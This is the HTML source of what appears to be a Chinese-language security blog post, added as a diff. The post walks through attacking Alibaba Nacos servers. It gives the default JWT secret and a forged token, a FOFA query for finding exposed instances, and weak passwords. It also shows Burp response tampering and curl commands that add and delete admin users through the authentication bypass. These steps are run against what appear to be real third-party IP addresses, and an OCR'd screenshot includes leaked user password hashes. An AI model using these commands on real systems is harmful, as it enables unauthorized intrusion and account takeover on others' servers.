@@ -1,0 +1,795 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/24.png">
+  <link rel="icon" href="/img/24.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Jimi">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Nacos 是阿里巴巴开源的一个动态服务发现、配置管理和服务管理平台。它专为微服务架构设计，提供了服务发现与注册、配置管理、动态 DNS 服务、服务健康检查、断路器等功能。Nacos 的核心组件包括服务注册中心、配置中心和控制台。 师傅笔记： JWT身份伪造:https:&#x2F;&#x2F;jwt.io&#x2F; 使用nacos默认key可进行jwt构造 nacos默认key（token.secret.key值的位置在c">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Nacost通过文件打出getshell">
+<meta property="og:url" content="https://jimi-lab.github.io/2024/06/01/Nacost%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6%E6%89%93%E5%87%BAgetshell/index.html">
+<meta property="og:site_name" content="Jimi&#39;s blog">
+<meta property="og:description" content="Nacos 是阿里巴巴开源的一个动态服务发现、配置管理和服务管理平台。它专为微服务架构设计，提供了服务发现与注册、配置管理、动态 DNS 服务、服务健康检查、断路器等功能。Nacos 的核心组件包括服务注册中心、配置中心和控制台。 师傅笔记： JWT身份伪造:https:&#x2F;&#x2F;jwt.io&#x2F; 使用nacos默认key可进行jwt构造 nacos默认key（token.secret.key值的位置在c">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://jimi-lab.github.io/2024/06/01/Nacost%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6%E6%89%93%E5%87%BAgetshell/img/1-0689325a.png">
+<meta property="og:image" content="https://jimi-lab.github.io/2024/06/01/Nacost%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6%E6%89%93%E5%87%BAgetshell/img/2-fd3d6622.png">
+<meta property="og:image" content="https://jimi-lab.github.io/2024/06/01/Nacost%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6%E6%89%93%E5%87%BAgetshell/img/3-f5aec518.png">
+<meta property="og:image" content="https://jimi-lab.github.io/2024/06/01/Nacost%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6%E6%89%93%E5%87%BAgetshell/img/4-de5c86b0.png">
+<meta property="og:image" content="https://jimi-lab.github.io/2024/06/01/Nacost%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6%E6%89%93%E5%87%BAgetshell/img/5-76a4abbb.png">
+<meta property="og:image" content="https://jimi-lab.github.io/2024/06/01/Nacost%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6%E6%89%93%E5%87%BAgetshell/img/6-98a8dbe0.png">
+<meta property="og:image" content="https://jimi-lab.github.io/2024/06/01/Nacost%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6%E6%89%93%E5%87%BAgetshell/img/7-7f23f555.png">
+<meta property="article:published_time" content="2024-06-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-08T06:49:04.488Z">
+<meta property="article:author" content="Jimi">
+<meta property="article:tag" content="Nacost">
+<meta property="article:tag" content="getshell">
+<meta property="article:tag" content="JWT">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://jimi-lab.github.io/2024/06/01/Nacost%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6%E6%89%93%E5%87%BAgetshell/img/1-0689325a.png">
+  
+  
+  
+  <title>Nacost通过文件打出getshell - Jimi&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/background_video.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"jimi-lab.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Jimi</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/trees.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Nacost通过文件打出getshell"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-06-01 08:00" pubdate>
+          2024年6月1日 早上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          664 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          6 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Nacost通过文件打出getshell</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>Nacos 是阿里巴巴开源的一个动态服务发现、配置管理和服务管理平台。它专为微服务架构设计，提供了服务发现与注册、配置管理、动态 DNS 服务、服务健康检查、断路器等功能。Nacos 的核心组件包括服务注册中心、配置中心和控制台。</p>
+<p><strong>师傅笔记：</strong></p>
+<p>JWT身份伪造:<a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a></p>
+<p>使用nacos默认key可进行jwt构造</p>
+<p>nacos默认key（token.secret.key值的位置在conf下的application.properties）</p>
+<p>SecretKey012345678901234567890123456789012345678901234567890123456789</p>
+<p>JWT DATA:</p>
+<p>{</p>
+<p>“sub”: “nacos”,</p>
+<p>“exp”: 1682308800</p>
+<p>}</p>
+<p>网站地址:<a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a></p>
+<p>时间戳网址:<a target="_blank" rel="noopener" href="https://tool.lu/timestamp/">https://tool.lu/timestamp/</a></p>
+<p>构造完毕的数据包:</p>
+<p>FOFA语句:app&#x3D;”nacos” &amp;&amp; port&#x3D;”8848”</p>
+<p>username&#x3D;nacos&amp;password&#x3D;nacos</p>
+<p>弱口令：</p>
+<p>ceshi</p>
+<p>crow</p>
+<p>crowr</p>
+<p>admin1</p>
+<p><a target="_blank" rel="noopener" href="http://101.42.21.9/">http://101.42.21.9/</a></p>
+<p><a target="_blank" rel="noopener" href="http://123.57.224.28:8848/">http://123.57.224.28:8848/</a></p>
+<p>&#x2F;v1&#x2F;auth&#x2F;users?pageNo&#x3D;1&amp;pageSize&#x3D;10 可查看到用户列表</p>
+<p>curl -X POST ‘<a target="_blank" rel="noopener" href="http://101.42.21.9/v1/auth/users?username=shangxin&password=shangxin">http://101.42.21.9/v1/auth/users?username=shangxin&amp;password=shangxin</a>‘</p>
+<p>-H ‘User-Agent: Nacos-Server’ 添加用户</p>
+<p>&#x2F;v1&#x2F;auth&#x2F;users</p>
+<p>username&#x3D;shangxin&amp;password&#x3D;shangxin</p>
+<p>User-Agent:Nacos-Server</p>
+<p>查看用户是否添加成功:</p>
+<p>&#x2F;v1&#x2F;auth&#x2F;search?username&#x3D;shangxin</p>
+<p>curl ‘<a target="_blank" rel="noopener" href="http://101.42.21.9/v1/auth/search?username=shangxin">http://101.42.21.9/v1/auth/search?username=shangxin</a>‘</p>
+<p>删除用户</p>
+<p>curl -X DELETE “<a target="_blank" rel="noopener" href="http://101.42.21.9/v1/auth/users?username=shangxin">http://101.42.21.9/v1/auth/users?username=shangxin</a>“</p>
+<p><strong>个人笔记：</strong></p>
+<p>对nacos网站先–》nacos漏洞综合利用工具</p>
+<!-- 这是一张图片，ocr 内容为：NACOS福河综合利用工具_V3.9 AUTHOR:CHARONLIGHT 设置 关于 HTTP://101.42.21.9/#/LOGIN 漏消!除测! 酒空面板 制润: ALL 漏制描述 目标: 弱口令保破 检测日志 汤洞说明 权限绕过深洞利用 SQL注入利用 YAML反序列化 内存马注入 北量检测 NACOS  格: 版本号: HTTP://101.21.9:80 如果NACOS的踏径不是学见的脂径,在目标中指测INACOS路径即可进行调及员利用 2.1.0 2024-03-19 20:49:58: 开始检测所有漏洞!!! 2024-03-19 20:49:58:1]不存在NACOS控制台默认口令临洞(NACOS,NACOS) 2024-03-19 20:49:58:[+]存在NACOS TOKEN.SECRET.KEY致认配蛋(QVD-2023-6271) TOKENTTL:18000,QLOBALADMIN':TRUE,USERNAME`:HACOS" 2024-03-19 20:49:58:[!]需要人工确认NACOS-CLIENT YAML反序列化滋洞 请使用YAML反序列化模块进行验证及具利用 2024 03-1920:49:58:[]不存在NACOS DERBY SOL注入蔬洞(CNVD-2020 67618) 存在NACOS 未控权访问漏洞)(CVC-2021-29441) 2024-03-19 20:49:58:1 [TOTALCOUNL':76, PAGENUMBER":1) TLABLE''S,PAGETTENS;;('USCRNAINE;;SQNDEERIT/171085075990759907HRYP:562CYEJO? ;  PASSWORD':S205Z WHAZRA8MXNNLA3MFFAPOWLJEKJP HZOO1IXIXIXIXZVXKOB2"''USERNAME"*1552EEDFELCAAB8FYDEROPYDEROPYDEROPYDEROPYDEROPYP8LX9HIKGPV- PASSVORD;;;,S28$10SRINW/(MASSBPXISADSSU)LGFAL/SPHQD3PKATJSRINT", PASSWORD';373510515KGPG5ZD34DCYINGEIROULWGSP/M3TRELLFLVEGGHIBUDBAFGN.KT('USERNAME;;;; ;;ADMIN1Z3', BGERFBPO"PASSWORD"**ZA$10SKVJE4XTB5AFRS4BNHOIAL.EYNAJETB8YZ11 2024-03-1920:49:58: 哲未实现POC检测,请使用内存马注入模块进行验证 -->
+<p><img src="/2024/06/01/Nacost通过文件打出getshell/img/1-0689325a.png"></p>
+<p><strong>1.伪造nacos用户登录</strong></p>
+<p><strong>exp：</strong></p>
+<p>JWT DATA:</p>
+<p>{</p>
+<p>“sub”: “nacos”,</p>
+<p>“exp”: 1682308800_<u>（这个为时间戳，要大于当前时间）</u>_</p>
+<p>}</p>
+<p>使用nacos默认key可进行jwt构造</p>
+<p>nacos默认key（token.secret.key值的位置在conf下的application.properties）</p>
+<p>SecretKey012345678901234567890123456789012345678901234567890123456789</p>
+<p>JWT身份伪造:<a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a></p>
+<!-- 这是一张图片，ocr 内容为：LEAM ABOUT THE UPCOMING CHANGES TO JWT IO AND SHARE YOUR FOEDBACK 4 JNT CRAFTED BY ENCODED DECODED CO EDIT THE RRYLOAD AND SECRET PASTE A TOKENHERE HEADER:ALGORITHM&TOKEN TYPE EYJHBGCIOIJIUZI1NIISINR5CCI6IKPXVCJ9.EY JZDWIIOIJUYWNVCYISIMV4CCI6MTCYMZYWMJQXN ALG:  HS256', 30.PHEZPZHPHICD0F691DWKIJLBG_DS_KNBTXRNU TYP":JWT I3_KP6G "EXP*:1723602417 EXP HMACSHA256 BASE64URLENCODE(HEADER) + '.* + BASE64URLENCODE(PAYLOAD). SECRETKEY012345678901. 默认KEY ESECRET BASE64 ENCODED SIGNATUREVERIFIED SHARE JWT -->
+<p><img src="/2024/06/01/Nacost通过文件打出getshell/img/2-fd3d6622.png"></p>
+<p><strong>bp抓包：</strong></p>
+<p>POST &#x2F;v1&#x2F;auth&#x2F;users&#x2F;login HTTP&#x2F;1.1</p>
+<p>Host: 101.42.21.9</p>
+<p>Content-Length: 29</p>
+<p>Pragma: no-cache</p>
+<p>Cache-Control: no-cache        </p>
+<p>Accept: application&#x2F;json, text&#x2F;plain, <em>&#x2F;</em></p>
+<p>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;113.0.0.0 Safari&#x2F;537.36 uacq</p>
+<p>Content-Type: application&#x2F;x-www-form-urlencoded</p>
+<p>Origin: <a target="_blank" rel="noopener" href="http://101.42.21.9/">http://101.42.21.9</a></p>
+<p>Referer: <a target="_blank" rel="noopener" href="http://101.42.21.9/">http://101.42.21.9/</a></p>
+<p>Accept-Encoding: gzip, deflate</p>
+<p>Accept-Language: zh-CN,zh;q&#x3D;0.9</p>
+<p>sec-ch-ua-platform: “Windows”</p>
+<p>sec-ch-ua: “Google Chrome”;v&#x3D;”113”, “Chromium”;v&#x3D;”113”, “Not&#x3D;A?Brand”;v&#x3D;”24”</p>
+<p>sec-ch-ua-mobile: ?0</p>
+<p><strong>Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcxMDkzNjAyMH0.b2Qruw41JqKA5u5hNcwxjlLxMbP98fznXy9y2oF7Xxo</strong></p>
+<p>紫色部分为Encoded</p>
+<p>得到返回包“200 ok”</p>
+<p>将返回包复制</p>
+<!-- 这是一张图片，ocr 内容为：自 新东二四日 英甲20:54 三门 X                                                                                                     PROJECT INTRUDER REPEATER WINDOW HELP BURP SUITE PROFESSIONAL V2021.9.1-TEMPORARY PROJECT-WEB BURP PR HAE PASSIVE SCAN CLLENT BURPJSLINKFINDER ONESCAN APIKIT XLA SQL 403 BYPASSER LOG42SCAN STRUTS FINDER PROXY PROJECT OPTIONS SEQUENCER LOGGER COMPARER HTTPHISTORY WEBSOCKELS HISTORY HTTPA COMMENT THIS LTEM 1 FOST /VL/AUTH/USORE/LEGIN HTTP/1.1 2 HOST:101.42.21.9 3 CONTONT-LENGTH:42 SCAN 4 ACCEPT:APPLICATION/ISON,TEXT/PLAIN.4/W DO PASSIVE SCAN O SAFARI/537.36 CACG 5 USER-AZENT:MT MINGA/5.0 (KINGOWS HT 10.0: WING4: X64) APPLAPPLAFEBRIT/&37.36 (KHTT 6 CONTENL-TYPE:APPLICATION/X-WWW-FORM-URLENCODED 7CRIGIN:HTTP://101.42.21.9 8 REFERER:BTTP://101.42.21.9/ SEND TO REPEATER CTRL-R 9ACCEPT-BNCODING:G2LPDEFLATE 10 ACCOPT-LANGUAGO:ZH-CH.CH.Q LL SOE-CH-WA-PLATFORN:WINDOWS 12 GOC-CH-UA:"GOOGLE CHROME";"113","CHROMITM":"13","HOT-ARBRAND":V24 13 SOO.CH-UA-MOBILE:70 14 CONNECTION: ELOSE 15 16 UGERNAME-DADADAWAADX-PASSXORD-WCAWADDANDAD CHANGE REQUEST METHOD COPY URI COPY AS CURL COMMAND COPY TO FILE PASTE FROM FILE DON'T INTERCEPT REQUESTS DO INTERCEPT RESPONSE TO THIS REQUEST URL-ENCODE AS YOU TYPE CUT CTRL-C COPY PASLE 0:14:15 MESSAGE EDITOR DOCUMENTATION PROXY IN TERCEPTION DOCUMENTATION 0 MATCHES NACOS通过文件打出GETSHELL 0% -->
+<p><img src="/2024/06/01/Nacost通过文件打出getshell/img/3-f5aec518.png"></p>
+<p>修改浏览器的响应包</p>
+<!-- 这是一张图片，ocr 内容为：RESPONSE FROM HTTP//101.42.21.9:00/VI/AUTH/USERS/LOGIN OPEN BROWSER INTERCEPT IS ON FORWARD ACTION 三 HEX RENDER RAV IN Q1 403 2 SERVER:NGINX/1.2 19 MAR 2024 12:54:46 GMT DATE:TUE. 4 CONTENT-TYPE:APPLICATION/JSON:CHARSET-UTF-8 5 CONTENT-LENGTH:13 CONHECTION:CLOSE CONTENT-SECURITY-POLICY:SCRIPT-SRC SE1 UNKOOWOUSER! -->
+<p><img src="/2024/06/01/Nacost通过文件打出getshell/img/4-de5c86b0.png"></p>
+<!-- 这是一张图片，ocr 内容为：RESPONSE FROM HTTP://101.21.9:80/V1/AUTH/USERS/LOGIN FORWARD OPEN BROWSER INTERCEPTIS ON DROP PRETTY HEX IN RAW RENDER 1 HTTP/1.1 200 2  SERVOR:NGINX/1.20.2 3 DATE:TUE 19 MAR 2024 12:54:28 GMT 4 CONTENT-LYPE:APPLICATION/JSONICHARSET-UTF-8 CONNECTION:CLOSE 6CONTENT-SECURITY-POLICY:SCRIPT-SRC SELL 7 SEL-GOOKIE:JSESSICNID-100B03A600B29F84C52BL6229F206549: PLLPONL 8AUTHOXI2AT CONTENT-LENGTH:197 9 CO "ACCENATAKEN':"EYJHIGGEIOIJINEYINIIEXTEXTERSECTEPRYCTANCTEXTEXTIDIJUYARVEYI;INVECTEXTEXTEXHDTELDHO,3R ORPPPNL8ABKSWE599AWY31-ZCS IRU7Y24FH4LI35GA8 TOKENTTL :18000 GLOBALADMIN :TRUE, SERNAME -->
+<p><img src="/2024/06/01/Nacost通过文件打出getshell/img/5-76a4abbb.png"></p>
+<p>Forward 后浏览器成功登录。</p>
+<p><strong>2.存在未授权</strong></p>
+<p><strong>没有登录的情况下，可以直接访问到网站</strong></p>
+<!-- 这是一张图片，ocr 内容为：内存 控制台源代码/来源代码内存 LO SUPERSEARCHPLUSTOOLS 应用EDITTHISCOOKIE HACKBAR 元系 ENCRYPTION LFI XXE ENCODING OTHER XSS SQL* HTTP://101.42.21.9/V1/AUTH/USERS LOAD URL 98 SPLIT URL EXECULE USER AGENT COOKIES CLEAR ALL REFERER POST DATA USERNAMESHANGXIN&PASSWORDSHANGXIN 控制台 新变化 开发者资源 网络状况 搜索X 酒盖率 LIGHTHOUSE -->
+<p><img src="/2024/06/01/Nacost通过文件打出getshell/img/6-98a8dbe0.png"></p>
+<p>&#x2F;v1&#x2F;auth&#x2F;users?pageNo&#x3D;1&amp;pageSize&#x3D;10 可查看到用户列表</p>
+<p>curl -X POST ‘<a target="_blank" rel="noopener" href="http://101.42.21.9/v1/auth/users?username=shangxin&password=shangxin">http://101.42.21.9/v1/auth/users?username=shangxin&amp;password=shangxin</a>‘</p>
+<p>-H ‘User-Agent: Nacos-Server’ 添加用户</p>
+<p>&#x2F;v1&#x2F;auth&#x2F;users</p>
+<p>username&#x3D;shangxin&amp;password&#x3D;shangxin</p>
+<p>User-Agent:Nacos-Server</p>
+<p>查看用户是否添加成功:</p>
+<p>&#x2F;v1&#x2F;auth&#x2F;search?username&#x3D;shangxin</p>
+<p>curl ‘<a target="_blank" rel="noopener" href="http://101.42.21.9/v1/auth/search?username=shangxin">http://101.42.21.9/v1/auth/search?username=shangxin</a>‘</p>
+<p>删除用户</p>
+<p>curl -X DELETE “<a target="_blank" rel="noopener" href="http://101.42.21.9/v1/auth/users?username=shangxin">http://101.42.21.9/v1/auth/users?username=shangxin</a>“</p>
+<!-- 这是一张图片，ocr 内容为：介主页 KALI UBUNTU 3月19日20:59华 回终端 活动 HACKER@UBUNTU-DRONE:~ 可 HACKERQUBUNTU-DRONE:-S CURL -X DELETE "HTTP://101.42.21.9/V1/AUTH/USERS?USERNAME-SHANGXIN" ("CODE":200,"MESSAGE":NULL,"DATA":"DELETE USER OK!"/"HACKERQUBUNTU-DRONE:-S -->
+<p><img src="/2024/06/01/Nacost通过文件打出getshell/img/7-7f23f555.png"></p>
+<p><strong>3.有数据库信息</strong></p>
+<p>user，passwd，port，host可进行数据库连接</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" class="category-chain-item">漏洞挖掘</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Nacost/" class="print-no-link">#Nacost</a>
+      
+        <a href="/tags/getshell/" class="print-no-link">#getshell</a>
+      
+        <a href="/tags/JWT/" class="print-no-link">#JWT</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Nacost通过文件打出getshell</div>
+      <div>https://jimi-lab.github.io/2024/06/01/Nacost通过文件打出getshell/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Jimi</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年6月1日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/06/01/CSV%E6%B3%A8%E5%85%A5/" title="CSV注入">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CSV注入</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/06/01/Druid%20monitor%E9%A1%B5%E9%9D%A2%E6%B8%97%E9%80%8F/" title="Druid monitor页面渗透">
+                        <span class="hidden-mobile">Druid monitor页面渗透</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments">
+      
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Jimi-Lab/Jimi-Lab.github.io');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+      
+<a href="https://github.com/Jimi-Lab" target="_blank" rel="nofollow noopener"><span>@Jimi.github</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
